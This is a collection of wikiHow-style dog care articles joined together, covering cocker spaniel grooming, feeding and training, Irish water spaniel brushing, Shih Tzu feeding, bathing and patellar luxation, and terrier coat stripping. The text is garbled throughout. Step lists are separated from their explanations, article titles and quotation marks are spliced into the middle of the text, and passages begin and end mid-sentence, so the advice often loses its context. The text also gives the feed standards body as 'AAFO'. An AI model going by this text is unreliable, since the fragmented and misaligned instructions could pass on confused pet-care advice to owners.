, Your vet will decide the cause of your dog’s ear infection, such as bacteria, yeast, or something else. This will determine how your dog is treated. Your vet will clean your dog’s ear.Most of the time, the vet will start with a topical ear drops in the office, which contain medications against yeast, bacteria, or ear mites. Then, your vet will give you an antibiotic, antifungal, or other medicine to administer at home.If the dog has regular ear infections, or the infection is slow to respond, the vet may perform further tests. These include examining discharge smears under a microscope or sending a swab away for culture.

Groom your cocker spaniel regularly and often.,
Brush your cocker’s hair at home on a regular basis.,
Send your cocker spaniel to a professional groomer.,
Introduce your cockers to groomers early in life.,
Take your cocker spaniel for regular checkups.",How to Care for a Cocker Spaniel2," Cockers need a lot of care for their coat, which is beautiful, but can be expensive and time-consuming. If you're not prepared for a lot of grooming, a cocker spaniel may not be the best dog for you.]


Cockers are famous for their beautiful, long fur. They are also well known as show dogs. However, their coat requires a fair amount of upkeep.

, This helps to keep their coat free of matted and tangled fur. A slicker brush is the best type of brush to use.Your cocker spaniel will take some time to get used to being brush. Be patient if they are skittish and pretty soon they will love it.
You can also keep their coat short to avoid having to brush their coat so often. However, you still need to send your cocker to a professional groomer on a regular basis.
Grooming your cocker yourself is possible, but can be time consuming and difficult. If you don’t want to groom your dog on a regular basis, a cocker spaniel is likely not the right dog for you

, Many owners have a professional grooming of their cocker spaniel every six to eight weeks. These grooming sessions can be expensive, since they are rather time consuming.


Groomers usually perform one of two cuts. The Classic Cocker is where the groomer shaves your cocker’s back, top of head, chest, stomach, and behind, but leaves long fur to grow on the legs and in between the legs. The Puppy Cut is where the groomer gives your cocker a full trim all over and leaves them having short hair., Have them groomed in small doses at first, so they become accustomed to it. Being in the room while they are being groomed as puppies also makes them feel more comfortable.


Cockers are often not cooperative with groomers, so give them plenty of exposure so they are not nervous when they go for a long grooming session.

, Cocker spaniels are prone to getting sick. They may come down with progressive retinal atrophy (PRA), cataracts, patellar luxation, and glaucoma. Have regular checkups with the vet to ward off any of these diseases.These dogs often come down with problems with their eyes. PRA, cataracts, and glaucoma are all serious eye conditions.
Cockers are also prone to skin conditions. They occasionally come down with itchy skin from allergies and can occasionally produce skin growths.
Ear infections are also common with cockers. Their ear canals are long and narrow, so wax buildup can be a problem for this breed.Loose knees, or patellar luxation, also happens occasionally with cockers. About 1 in 4 Cockers comes down with loose knees at some point in their lifetime.

Give the dog a monthly wash.,
Put them at ease.,
Use a grooming table.,
Give them a general brushing.,
Check for matting.,
Start with the head.,
Move on to the feet.,
Brush the body.,
Reward them with a treat.",How to Brush an Irish Water Spaniel," The coat of your spaniel will be easier to brush if you shampoo it regularly.One shampooing per month will clean the fur adequately while still allowing its natural oils to benefit the coat and skin.Shampooing can help to untangle and soften the coat, making brushing less discomforting for the dog and less strenuous for you.


Make sure the dog’s coat is fully dry before beginning with brushing.Another way to soften the coat before brushing is to use an anti-static spray.Most pet stores with dog grooming supplies should carry this.
You can begin shampooing a puppy after they're five weeks old.;
, Some dogs may shy away from being brushed, especially when they’re younger and not used to it. But you can help to calm them by petting them in their favorite spot, such as the chest or stomach. Talking to them in affectionate and reassuring tones before and during the brushing can also make them less nervous. And offering them small treats as you brush will help to keep their attention off any discomfort they may feel, while creating a positive association between brushing and rewards.For example, you could tell them, ""That's a good dog, come here and get some treats,"" or ""Sadie, time for brushing, here's a treat, that's a good girl.""
Avoid grooming just before meals or soon after they wake up, since they may be more restless at these times.

, In order for you and your dog to be in the best position for brushing, place the dog on a table for brushing. The higher the table the better, since the closer the dog is to your torso area while you stand, the less you’ll have to bend over and potentially strain your back. A workbench or kitchen counter will typically be near the correct height to act as a grooming table.


To prevent your spaniel from slipping while being brushed, place non-skid material, such as a rubber mat or sturdy cloth, over the surface of the table.If your spaniel refuses to stay on a high table, you can try grooming them on a bed or couch.

, Use a coarse scrub brush with natural bristles to comb once gently through the entire coat. This will remove superficial dirt and loosen up the coat for the next stages of brushing.Since Irish water spaniels have long and soft hair, you should use a scrub brush that has long, widely spaced, and soft bristles., A good way to locate matted hair is to comb through the coat with a wide-tooth steel comb. If you come across any tangled, clumped, or matted hair, first try to gently tease out the tangle with the steel comb. Whatever matting remains can be separated with a de-matting comb or mat separator. And adding some vinegar to the matted or tangled area can loosen it and allow you to comb it out., Now changing to a slicker brush, comb through the puff of hair on the head, or “top knot.” This should be done by brushing in the direction opposite the way the hair falls. Flatten the top knot forward against the top of the head, and brush it in this direction. Then flatten it back the other way and brush toward the back end of the dog.As you proceed, remove dead hair caught between the bristles of the slicker brush.


Continue with the ears, brushing first upward against the way the hair falls, then downward to smooth it out.
Start by brushing the top of the hairs, and work your way down toward the skin. Brush more gently as you get closer to the skin., Pick up a front foot by the elbow, and brush upwards against the fall of the hair. Then, as with the top knot, brush downwards to smooth out the coat. Then repeat this with the other legs.Pay extra attention to high-friction areas under the legs, where matting and tangling are typically found.Since you’ll only be holding one leg at a time, the dog may be tempted to run off at this stage. If the dog does try to escape, ask someone to help you hold their body as you brush the feet.

, Finally, use the same technique to brush through rest of the body, still using a slicker brush. Starting at the neck, brush toward the front, removing dead hair from the comb’s teeth. Then brush the same area in the opposite direction, smoothing the coat out towards the back end. Work toward the tail, then finish by brushing the belly., After you’ve finished, be sure to reward your dog with their favorite treat, pet them, and tell them that they were good. Concluding the brushing session this way will make your spaniel less likely to be afraid to be brushed the next time.

Give your cocker spaniel the right food.,
Make sure the ingredient list for a dog food brand starts with a meat.,
Ignore terms like ""natural"" or ""premium"".,
Avoid foods that are harmful to dogs.,
Feed your cocker spaniel puppy food.,
Look for puppy food when getting food for your young cocker.,
Find dog food specific for your cocker's breed.,
Feed your puppy the right amount.,
Feed your cocker spaniel adult dog food.,
Feed them on a regular schedule.",How to Care for a Cocker Spaniel3," Cocker spaniels usually eat dog food, though it's best to pay attention to the ingredients list to get the right food for them., Manufacturers will often try to use other ingredients, such as wheat or grain, to make the dog food heavier. However, this will make it less nutritious for your cocker.

, These do not really mean anything as it applies to your dog food. Viewing the ingredients list is the best way to find high quality dog food.

, In particular, stay away from foods like chocolate, grapes, onions, and candy. Some of these food can cause serious damage to a dog’s organs or maybe even cause death.Cockers are especially drawn to eating rich, fatty foods. These foods can cause pancreas problems, so make sure to keep them out of reach of your dog.

, Puppies need to be fed differently than adult dogs. Puppy dog food is usually higher in vitamins, minerals, proteins, and fats than adult dog food., This will guarantee your puppy gets the necessary vitamins and nutrients to grow up as a healthy adult dog.


You can also get dog food that's for ""all stages of life"" that works for puppies as well. Verify to make sure the food is fortified with vitamins and minerals to guarantee the dog's health.

, You may also find dog food that meets the unique dietary needs of a cocker spaniel. For a smaller breed like a cocker, dog food may be smaller in size and focused on meeting your dog's high metabolism. Read the labels carefully when you purchase dog food to get the right brand for you.

, Give them puppy food four times a day for the first six months. After that, you should feed them only twice a day.


Avoid overfeeding your puppy. You should be able to see your puppy's waist, but not their ribs. #*Puppies will eat as much as you give them. Follow the directions on the puppy food and only feed them during schedule times.

, When they grow up, your cocker needs to have adult food. Consider feeding them different diets, including dry food, canned food, home cooked food, raw food, or vegetarian food. It's also important to maintain a consistent schedule when feeding your cocker.Adult cocker spaniels can eat dry food. It's the most convenient and easiest to feed them on a regular basis. Keep in mind that dry food does not manage a dog's teeth, so you'll need to clean them even if they are eating dry dog food.
Dogs love canned dog food, since it's much more flavorful. However, there is a lot of water in canned dog food, so it does become more expensive to feed your cocker on a regular basis.
When cooking home cooked meals, you always know what you are feeding your dog. Keeping the nutritional balance for your meal is difficult, so make sure to pay attention to your dog's nutritional needs.
Raw food is especially expensive. If you are making raw food yourself, it can also be time consuming. Some pet food companies are beginning to make raw food diets you can buy, but it is also very expensive.
Cockers can also eat vegetarian, though you have to make sure to give them plenty of protein in their food. You can also buy vegetarian meals in many pet stores so you don't have to make it all yourself.

, Cockers need consistency to maintain a healthy diet. If they don't eat all their food in twenty minutes, take it away so they will learn to eat at a specific time rather than grazing.

Housebreak your cocker spaniel.,
Anticipate when your dog may need to go the bathroom.,
Train your dog to go to the bathroom outside.,
Use common phrases to get your dog to go.,
Clean up any accidents quickly.,
Install a doggy door so your cocker can get outside without you.",How to Care for a Cocker Spaniel4," Cocker spaniels are occasionally difficult to potty train. Be firm while you're housebreaking your puppy, but patient. Repetition is the best way for your cocker to become housebroken., After a nap is a common time to take your cocker outside or even after a long period of time since they have last used the bathroom.

, When they need to go, repeatedly take your dog to the same spot. Eventually, they will learn to go to the bathroom in the same spot outside.


Having a common spot to use the bathroom is useful for encouraging your cocker to make. The smell of urine in the same spot will encourage your cocker to urinate as well.

, Things like ""Go Potty"" or ""Do Your Business"" can be triggers for dogs to know it's ok to go to the bathroom.

, The smell or urine may encourage your cocker to go again. Make sure your cocker can go outside without you to avoid accidents.


Gently scold your cocker for accidents. Don't be mean or hit the dog, but make sure they know they did a bad thing.

, This way they can find their way to an enclosed yard to use the bathroom whenever they feel the urge. They may not always be able to tell when they need to go, so it’s important for them to be able to get out on their own.


Occasional accidents are unavoidable with a cocker, since they often urinate when they get excited. Be patient and understand it may take awhile to potty train your cocker.

Teach your cocker spaniel obedience.,
Speak firmly with your cocker when do something bad.,
Don't ever hit, yell, or choke your dog.,
Teach them how to greet others.,
Make sure your dog doesn't hold any prejudices.,
Observe your cocker closely when they are first interacting and limit their initial exposure.",How to Care for a Cocker Spaniel5," Use both positive and negative consequences to train your cocker what to do and what not to do. Give them praise when they do something good and speak firmly with your voice or their lease if they do something bad.When your cocker does something good, reward them. This can be in the form of praise like ""good boy"" or ""good girl,"" treats, or petting. They will quickly learn to repeat this behavior to get praise from you.

, You can also use their collar or lease to tell your cocker about bad behavior. A strong word or movement can send a firm message to your cocker if they do anything you don’t like.

, Dogs will learn to fear you rather than respect you.


Sometimes dogs won't listen because they are not getting enough attention. This is especially true with social breeds like the cocker. Make sure to get enough time with the cocker to discourage misbehavior.

, Cockers are excitable dogs, so they may try to jump on others. Be firm and teach them to wait for people to pet them first.

, Some dogs prefer women to men or can even hold prejudices against types of clothing. Introduce your cocker to all kinds of people, so they are used to them.


Children are often frightening for dogs, even for dogs great with children like cockers, since they are so unpredictable. Socialize your dog with children early so they get used to being around them.

, Getting along with other dogs and cats is also important for your cocker. Exposure is key for cockers to get used to other animals.

Determine your Shih Tzu’s weight.,
Feed your Shih Tzu the appropriate amount of food.,
Give your Shih Tzu food in the morning and evening.,
Avoid leaving large amounts of food out for your pet.,
Adjust the feeding schedule for older or less active Shih Tzus.",How to Feed Your Shih Tzu1," It’s always best to have your veterinarian or groomer weigh the dog, since they have scales specifically created for this task. However, you can weigh your Shih Tzu at home with a method that is only slightly less accurate. Start by standing on a scale while holding your dog. Then, put the dog down, and weigh yourself again. The difference in these two weights should be your dog’s weight., This breed is prone to obesity, so it’s especially important to count calories. On average, older Shih Tzus and puppies need about 280 calories a day, adults need about 340 calories, and very active dogs need about 540 calories. You should be able to find the calorie information on the pet food bag. In most cases, this information is found either as part of the nutritional information or within the feeding guide. If you cannot find caloric information on the packaging, you may want to reconsider your choice of pet food, or contact the supplier directly.


A good equation to determine how much to feed your specific Shih Tzu is 35 times each pound of body weight equals the total number of daily calories. For example, a 9-pound Shih Tzu would need to consume 315 calories a day: 9 X 35 = 315.
Older dogs and puppies need to consume about 30 calories per pound of body weight. The same 9-pound Shih Tzu from the sample above would need 270 calories a day as a puppy and in their old age: 9 X 30 = 270.
Use these calculations as a good starting point or guideline, but they may not be quite right for your dog. Each week feel for your dog's ribs — they should be easy to feel without applying pressure, but they also shouldn't be jutting out of their fur. If you can't find the ribs, then cut the amount of food by 10%.
Dogs are considered senior after the age of seven, and should be considered puppies until they are one year old., Some Shih Tzus will thrive with one large meal, but typically, splitting their daily calorie allotment between a morning and evening meal is preferred. This keeps your pup’s belly full and minimizes the amount of blood sugar peaks and valleys, offering more consistent energy levels.


Until three months old, you can let puppies free feed. Provide them food equivalent to 30 calories per pound of weight, and let them graze throughout the day, unless they show signs of gorging. If your pup eats all of the food at once and is sick, you may need to split their meals up.
Between three months and one year old, feed your Shih Tzu three times each day. After the pup reaches one year of age, you can begin feeding them one or two meals a day., This is called free feeding, and after your Shih Tzu reaches three months of age, this may encourage overeating. As a breed, Shih Tzus are prone to being overweight, so it’s especially important to avoid overfeeding. Instead, portion out their food to split calories into two smaller meals spaced throughout the meal.

, Once your pup reaches the age of seven it’s considered a senior. At this age, you’ll need to reduce their caloric intake. As they age, some dogs will not be able to eat very much at one time. Monitor their food consumption, and if you notice they just eat a few bites within 20 or 45 minutes, you can probably revert to free feeding.


If you have a less active dog, you will need to reduce intake to 30 calories per pound, but you should continue to feed them at regular intervals to avoid weight gain."
"
Determine the nutrients necessary for optimal health.,
Prepare and freeze homemade dog food to preserve it.,
Include supplements in your Shih Tzu’s meal.",How to Feed Your Shih Tzu2," Your pup needs to consume a variety of foods to achieve the optimal levels of health and vitality. The American Association of Feed Control Officials (AAFO) sets appropriate nutritional minimums and maximums for each necessary nutrient, but basically, you should ensure your pet has appropriate levels of protein, fatty acids, and vitamins and minerals.


Fatty acids are essential to ensure your dog has adequate energy. These can be derived from animal products; oils like cod liver, fish, and olive oil; and from seeds and nuts.
Carbohydrates provide an easily burned energy source for your pup, and should comprise a significant portion of your dog’s daily intake, especially if you have a very active Shih Tzu.
Vitamins and minerals are necessary in very small quantities, but you should make sure your Shih Tzu is receiving adequate levels of vitamins K and B, folic acid, and choline. Talk to your veterinarian to ensure you are including adequate sources of these vitamins or to get supplements to make up the difference., There are numerous recipes available online free of charge as well as pet cookbooks and other resources available to help you make healthy foods for your Shih Tzu. Regardless of what recipe you choose, you may want to consider making large batches of one or two recipes and storing them in the freezer to extend the shelf life.


Prepare a month or more worth of food with two recipes at a time, and stagger your Shih Tzu’s meals each week., The American Association of Feed Control Officials (AAFO) recommends supplements be used sparingly as a well-balanced diet already includes many of these key nutrients. However, if you’re preparing your own foods, you need to make sure your Shih Tzu has adequate levels of vitamins B and K, folic acid, choline, and fatty acids.


Take into account those vitamins and minerals present in the meats, grains, and vegetables you use to make your dog’s food.
Then, add in supplements as necessary to ensure your pup is receiving appropriate levels of each.
Always consult your veterinarian before giving your Shih Tzu any supplements."

Trim your puppy’s nails.",How to Bathe a Shih Tzu Puppy," It is recommended to bathe a Shih Tzu every three weeks.However, puppies may need to be bathed more frequently, since they can soil their bottoms when they defecate. Using high-quality shampoo and conditioner will help ensure that your puppy’s coat and skin will be clean and remain healthy.


The variety of shampoos and conditioners from which to choose at your local pet store may be bewildering. To narrow your search, you can look for tearless, puppy-specific shampoos.Hypoallergenic shampoos are also good for puppies. They are free of detergents, fragrances, and additives that may be harsh on your puppy’s skin. Good-quality hypoallergenic shampoos contain such ingredients as avocado, coconut oil, or lanolin.Conditioner has many benefits. It prevents hair breakage, seals the hair shaft (helps to keep out dirt and stains), and can prevent dry and itchy skin after a bath.Conditioner is especially useful in longhaired dogs like Shih Tzus.
Spray conditioners are also available that can give your puppy’s coat a nice sheen after bathing. The spray can also protect your puppy’s coat from the sun and other outdoor elements, such as wind and dry air.Leave-in conditioners are ideal for Shih Tzus. Conditioners that need to be rinsed out are usually not strong enough for Shih Tzu coats.If your puppy has specific skin issues, your veterinarian can assist you in identifying which shampoo and conditioner would be best for your puppy.
Human shampoos and conditioners have pHs that could irritate your puppy’s skin, so do not use your own shampoo and conditioner to bathe him.;
, Other than shampoo and conditioner, you will need several other supplies: comb, brush, cotton balls, towels, washcloths, and a pet-specific blow dryer. The comb should be a double-sided stainless steel comb and will be used after he is dry.A bristle brush will be needed to brush him before the bath.Canine bath brushes are available that are helpful in bathing puppies.Pin brushes especially useful for Shih Tzus, given their long hair.Bristle and nylon mixture brushes are also good for Shih Tzus.The cotton balls will be helpful to keep water out of your puppy’s ears when you are bathing him.
You will need several towels: one to put in the bottom of the sink or tub for traction, and a few with which to dry him off after the bath.
Washcloths will be needed to clean your puppy’s face and around his eyes.The blow dryer must be specific for pets, since the intense heat from human dryers could result in thermal damage to your puppy’s skin. Blow dryers are especially useful for longhaired dogs.
If you plan to groom your puppy after the bath, you may also need nail clippers, styptic powder, and ear cleaner.

, If this is the first time that your puppy has been bathed, he will need some time beforehand to become comfortable with the bathing process. This means that he will need to get accustomed to the sights, sounds, and sensations of bath time. Your puppy may need only a few days, or he may need even longer (a week or more) until he is at ease with what bath time will mean for him.


For example, let him get used to the sound of running water. To acclimate your puppy to the blow dryer, first show it to him when it is turned off. When he is comfortable with it being turned off, turn it on while facing away from him. Gradually move closer to him with the blow dryer turned on until he is not frightened or wary of it. This process may take at least several days, depending on your puppy's comfort level. Give him treats during this acclimation process.Let him sniff all the supplies that you will use to bathe and groom him.In addition to his regular play time, spend time touching his paws, handling his ears, and rubbing him all over in general.The more comfortable he is with you touching him, the better he’ll react to you rubbing him with shampoo and conditioner.
Give your puppy plenty of verbal praise and treats when he responds positively to the acclimation process.Rewarding him will help get him ready to have a positive experience at bath time.

, Because your puppy is so small, you can easily bathe him in either the utility sink (if you have one) or the bathtub. Whichever location you choose, be sure to place either a towel or slip-proof mat on the bottom surface to keep your puppy from slipping or falling during his bath.In addition, it is important for puppies to be warm.A small space heater may be useful in keeping the room warm.
Organize all of your supplies in the bathing area. This will keep you organized and efficient, as well as lessen the chance that you will have to turn your back on your puppy during the bathing process.
Place some of your puppy’s toys in the sink or bathtub. This will help keep him entertained during the bath and will make the experience more fun for him.Plastic toys and toys inside which you can hide a treat are good to have your puppy play with during bath time.Consider diluting the shampoo (1 part shampoo to 10 parts water)and conditioner (1 part conditioner to 8 parts water).Diluting each product may be necessary if your puppy has particularly sensitive skin.
It would be helpful to keep some treats nearby to feed to your puppy while you are bathing him.

, Rather than calling him to come to you, you should go to him, pick him up, and carry him to the sink or tub.If your puppy is extremely young, he may not yet know how to respond consistently to his name being called—this is another reason to go to him rather than call him to come to you.


Walk slowly with your puppy and talk to him in a quiet and soothing voice to keep him calm before bath time. His first bath may be an unsettling experience for him, so you will want to make him feel as comfortable as possible.
You can also offer him some treats as you are carrying him.

, Use a bristle brush to smooth out your puppy’s coat and remove mats (areas of clumped fur) before bathing him. These mats can become nearly impossible to comb or brush through when the fur becomes wet, so it is preferable to get the hair as smooth as possible before getting your puppy wet.Shih Tzus have long hair, which can make brushing a challenge.
Detangling sprays are available that could help you brush through knots and mats in your puppy's fur.Detangling products are available at your local pet store.
Spraying water on your puppy's coat while you are brushing him can also brush through knots.Brush down your puppy and toward his back., It is very important to test the temperature of the water before getting your puppy wet. The water should be no warmer than lukewarm. If you are bathing him in your bathtub, try using a handheld showerhead to get him wet. If he is frightened by the showerhead, you can fill a pitcher with water and pour the water over him.


Gently hold his head up to avoid getting his face and eyes wet.Make sure that you place cotton balls in his ears before getting him wet., Follow the instructions on the shampoo bottle to determine how much shampoo to use. Starting from the back of your puppy’s head and working your way back to his tail, use your hands to gently work the shampoo into his coat and skin. As mentioned previously, you could use a canine bath brush rather than your hands to bathe your puppy.


Pay particular attention to your puppy’s belly and the area between his back legs.These areas tend to get very dirty, so you want to make sure you don’t miss these places when you bathe your puppy.
Gently position your puppy's head upward when shampooing him to avoid getting shampoo in your puppy’s eyes, ears, and mouth., Residue from the shampoo can make your puppy’s skin itchy and uncomfortable,so you will need to rinse his coat thoroughly to remove all of the shampoo. Because dogs’ coats tend to be thicker than human hair,several rinses may be necessary to get all of the shampoo out.


You will know when you have rinsed out all of the shampoo when you no longer see suds in your puppy's coat or in the water in the bottom of the sink or tub.

, Apply the conditioner in the same way that you applied the shampoo. This is a crucial step to moisturize your puppy’s coat, replenish his skin’s essential oils, prevent hair breakage, and seal the hair shaft.Follow the instructions on the conditioner bottle to determine how much conditioner to use and how long you should leave it in before rinsing it out.

, Dampen a clean washcloth and gently wipe your puppy’s face. Be sure to wipe in the corners of his eyes, and around his eyes, to remove tear stain and excess goo.Make sure to clean around the corners of his mouth as well.


Shih Tzus have shallow eye sockets, which makes them prone to excessive tearing and subsequent reddish-brown tear stains.You can use a small amount of hydrogen peroxide, applied to a cotton ball or small washcloth, to remove the tear stains., First, use a few towels to pat him dry. It is important to pat him dry, since using a rubbing motion can cause split ends to develop in his coat.Once you have patted him dry, use the blow dryer to finish drying him off. Use one hand to work through and lift the hair while you are using the blow dryer.This will ensure that all layers of his coat are fully dried.


To prevent thermal damage to your puppy's skin, use the lowest possible heat setting on the blow dryer and do not keep the heat in any one area for a long period of time.Make sure to keep the blow dryer's nozzle at least a few inches (about five to eight centimeters) away from your pet's coat.Keep in mind that your puppy will probably have the urge to shake off as soon as you finish rinsing out the conditioner.
Remember to remove the cotton balls from his ears after you have finished drying him off.

, When he is fully dried off, use your double-sided stainless steel comb to comb through his coat and remove any tangles.Once his coat is all smoothed out, you can use your spray conditioner to put a nice finishing touch on his coat.

, Keeping your puppy’s ears clean is just as important as keeping the rest of him clean. Following the instructions on the ear cleaner bottle, pour the recommended amount of ear cleaner into your puppy’s ears, one at a time, and gently massage his ears. Use a clean cotton ball to clear out any obvious debris.If you are comfortable doing so, use a small pair of tweezers to remove hair from your puppy’s ear canal.If you are unsure of how to do this, your veterinarian or local pet groomer can do this for you.

, Using your nail clippers, trim your puppy’s nails down to just above the quick. The quick is the blood vessel that runs halfway through your puppy’s nail.It is easy to identify if your puppy has light-colored or transparent nails.


The quick has many nerve endings.If you trim past the quick, not only will the nail start to bleed slightly, but your puppy will experience some pain.
If your puppy has light-colored or transparent nails, you may be able to see the quick from the side of your puppy's nail. If this is the case, trim the nail until you see that you are just above the quick.
If your puppy has dark-colored nails, trim a very small amount at a time and look at the cut edge of the nail. Stop trimming when you begin to see a gray or pink oval in the cut edge of the nail—this oval is the quick.If you trim the past the quick and the nail starts to bleed, dab a small amount of styptic powder onto the nail to stop the bleeding.The bleeding will stop immediately after you apply the styptic powder.
If you are not comfortable with trimming your puppy’s nails, your veterinarian or local pet groomer can perform this task.

Line the bottom of the sink with a rubber mat or thick towel so the dog doesn't slip. Run the water and test it on your wrist; the water should be lukewarm, not hot., Lay down extra towels on the ground and counter to absorb any water that might splash out of the sink during your dog's bath time.

, Before bathing your Shih Tzu, make sure to brush them to remove mats and tangles that could be worsened in the water.This is best done with the dog on their side; make sure not to tug or pull hair. Use a small comb to brush hair around the eyes carefully., To prevent water from entering your dog's ears, place small cotton wads in each ear. Do this gently and be careful not to hurt the dog if it wriggles around during this process. To make things easier, brace the dog's head and offer them something to bite (like a toy or bone) while you insert the cotton."

Steel comb
Detangling comb and spray
Small pair of scissors

, Since your Shih Tzu is so small, you may be able to hold it in your lap to brush its coat. However, if your Shih Tzu won’t stay still on your lap, put it on a solid surface, such as your floor or a table.However you position your Shih Tzu, let it relax before you start brushing it. Talk to it in a soft voice to help it feel comfortable., To make brushing easier, spray the detangling spray throughout the coat first. Then, working in small sections and outwards from the skin, brush the coat with the pin brush.It doesn’t matter where you start and finish with the brushing—just be consistent each time.Keep the pin brush flat and brush with long, sweeping strokes. Twisting or turning the brush could cause hair breakage.Don’t forget to brush your Shih Tzu’s armpits and the insides of the legs.These areas can be easy to miss.
If you get to a tangle or mat, don’t yank through it with the brush. If you can’t brush through it, save it until later to work on.

Look for high-quality ingredients.,
Ensure your Shih Tzu's food has adequate protein.,
Find foods with appropriate fat content.,
Feed your Shih Tzu the right amounts of bone health nutrients.",How to Feed Your Shih Tzu3," The key information you're looking for is a label that lists a protein source derived from a quality source as the main ingredient. Quality is determined by sources of whole meat rather than meat by-products or plant-derived protein sources. Once you have determined the percentage of each key nutrient in your pet food (protein, fiber, fat, etc.), you should compare these to the standards set forth by the AAFO, American Society for the Prevention of Cruelty to Animals (ASPCA), and other organizations that assess the quality of foods.


Check for labels that indicate the food has been certified by the AAFO.
Make sure the pet food does not include large amounts of sodium, sugar, or chemicals. If you don't recognize the foods in the ingredient list, chances are the food is not of adequate nutritional quality., The main difference between dog foods, besides price, is typically the quality of protein sources. You want to find ingredient lists that include whole meat sources. For other nutrient sources, avoid anything that uses modifiers in the description like derivatives, additives, or byproducts. For grains and other additions that provide carbohydrates, vitamins, and minerals, look for sources like oats, seaweed, and rice rather than cereals or wheat., This nutrient is essential in providing your dog with adequate energy and muscle and immune system sustaining amino acids. Puppies need foods that contain at least 20 to 25% protein, and adult dogs need between 15 and 20% protein foods. You should look for foods with high quality protein sources like chicken, beef, or fish., This is essential to ensuring your pup's ongoing health. While fat may sound unhealthy, it actually helps with the development of healthy brain tissue and provides an energy source for your pup. Puppies need between 5 and 10% crude fat in their diets, and adult Shih Tzus need foods that are about 5% fat. Fat can be derived from the meat source or from a supplement like fish oil., You'll need to ensure your pet receives calcium, phosphorous, and potassium from their foods. These nutrients aid in a number of health functions, but they are most essential in the development and maintenance of strong, healthy bones. These nutrients make up less than 5% of your pet's meals, but it's very important to make sure your pet food includes adequate amounts to meet your dog's needs. Typically, you'll need between half and one percent of each of these nutrients."

To do this, use the face comb to the part the hair from the top of the nose to between the eyes. Gather the hair into an inverted ‘V’ and secure this hair with an elastic band.As the hair grows longer, you will need to adjust the topknot to hold more hair.Do not make the topknot too tight.If your Shih Tzu is trying to get the topknot out, or the hair looks tightly pulled back from the face, you’ll know the topknot is too tight.

, Shih Tzu are prone to tear stains, since the long facial hairs can irritate the eyes and cause excessive tearing.

Look for skipping on the back leg.,
Watch for difficulty jumping.,
Monitor for other leg problems.,
Recognize the symptoms at any age.",How to Diagnose Patellar Luxation in Shih Tzus1," A typical sign of patellar luxation is when the dog skips on a back leg. He may be perfectly mobile and not in pain, but every now and again he skips a step. He may also carry a back leg for several steps before putting it back down again.This is due to the mechanical locking of the knee joint due to the faulty anatomy. After a few steps, things tend to shake back into place and the dog continues to walk as normal.
Patellar luxation occurs in the back legs. This means your dog may move all the weight into the front legs.;
, It is possible in some dogs for both legs to be affected by patellar luxation. If this is the case, the dog may look like he’s doing a bunny hop with both legs together.If your dog has the condition in both legs, he may have difficulty jumping up onto furniture or low surfaces.

, In severe or long term cases, the dog may develop secondary problems. One secondary problem may be arthritis in the joint. There may be swelling or stiffness in the leg or joint. If the dog is using the leg less, he may also develop muscle wastage on that side, which means the muscles on the affected side will be smaller than the ones on the other side.Your dog may also exhibit lameness on the affected leg. Lameness means your dog won't have the ability to walk on that leg.

, A dog can get patellar luxation at any age. Many dogs often present symptoms as a puppy because it is a problem with the muscles of the legs. Dogs can start presenting symptoms at at eight to 10 weeks."

Pin brush
Metal-toothed comb
Thinning shears
Electric clippers with a #10 blade (#8.5 blade optional);
, Your Scottish Terrier will be much easier to groom when it's on an elevated surface, like a grooming table. Put the grooming table in an area that has good lighting.Organize all of your tools so everything you need will be close by.


Having your Scottish Terrier on a table will keep you from bending over and hurting your back while you groom.
Grooming tables are available online or at pet stores. If you do not want to buy a grooming table, you could use a sturdy card table.

, Scottish Terriers have two coat layers: a soft, wooly undercoat and a coarse, weather-resistant outer coat.To keep your Scottish Terrier’s coat in good condition, brush it at least once a week. Use this time to check its skin for anything abnormal (redness, lumps, scrapes).Here are general tips for good brushing technique:Always be gentle.
Brush in the direction of hair growth, working outwards from the skin.

, A pin brush has wire bristles that painlessly remove loose, dead hair.Brush through the undercoat and outer coat. It may help to brush in small sections at a time.


Brush the eyebrows and beard forward. Also, don’t forget the easy-to-miss areas, like the elbows and inner thighs.If you see knotted hair, do not yank through the knot with the brush. Yanking would be painful. If you cannot brush through the knot, leave it until later.

, Combing through the coat will help you remove knots that didn’t come out during brushing.When you get to the knots, spray some detangling spray on them. Let the spray sit for a few minutes, then comb through each knot.If the knots are large, use your shears to split the knot into small vertical sections.Then, comb through each small section until the hair is smooth again.

Maintain your dog’s teeth.",How to Groom a Cairn Terrier," Cairn terriers do not shed. When the hairs die, they stay in the hair follicle, rather than simply falling off with regular shedding. To keep a Cairn terrier’s coat nice and healthy, those dead hairs need to be physically removed from the follicle. This is called rolling or stripping the coat.Rolling the coat can be done by hand or with a grooming tool called a stripping knife.Either method will be effective.;
, Rolling the coat can be done at home, but it can be tricky if you have never done it before. It may be worth it to contact a groomer so you can be sure you are using the right technique.

Rolling the coat should not cause your dog pain, and should not leave them with bald patches.

, Rolling a Cairn terrier’s coat can take a long time. Fortunately, unless the Cairn terrier is a show dog, the rolling process needs to be done only about once a month.Rather than rolling the coat all at once, you could break up the task into several months.This would be a good idea if your Cairn terrier doesn’t like staying still for long periods of time.

, Rolling the coat needs to be done in small sections, a few hairs at a time.Depending on how calm your dog is, you could hold it the entire time. If this isn’t practical, ask someone to gently hold your dog as you do the rolling.

, Before rolling, brush your Cairn terrier’s coat in the direction of hair growth. This will help ensure that the new hair grows in the proper direction.Cairn terriers have a double coat: a soft, fluffy undercoat and a coarse topcoat.Brush both coat layers.


Use a slicker brush.You can find one at your local pet store.

, Gently lift a small section of hair with your thumb and index finger.With your other hand, stretch the skin in the opposite direction. Stretching the skin this way will support it as you roll the coat.If you’re using a stripping knife, hold the hair with your thumb and the knife.Your thumb should be on the underside of the hair and the knife on top.
Consider putting some cholesterol on either the stripping knife or your fingers. The cholesterol will make it a little easier to pull out the hair. Purchase a jar of cholesterol at a beauty supply store., Pull the hair in the direction of hair growth so the dead hairs come out and the healthy hairs stay in place. Do not yank the hair out: if the dead hairs are ready to come out, they’ll come out easily and your dog won’t feel any pain. Your dog may fuss during the process, but it won’t be in pain.Start the rolling process at the back of your dog’s neck and work your way down its back. Be especially gentle pulling your dog’s belly hair.As you pull, do not bend your wrist. Doing so could break the hair., A Cairn terrier’s tail has a characteristic cone shape. It will be easier to maintain this shape by pulling out the dead hair, rather than clipping the hair.Pull the hair from the tail’s tip to the tail’s base. Be gentle with the pulling, since many Cairn terriers don’t like their tails being handled., The dead hair on your Cairn terrier’s face will also need to be removed. Your dog won’t enjoy this part either, so be gentle. First, brush the hair back in the direction of hair growth. Pull the hairs, working from the muzzle to the jawline.Pull the hairs around the eyes so the hairs don’t cover up the eyes., Brushing your Cairn terrier will certainly be less time consuming than rolling its coat. Even still, you should still 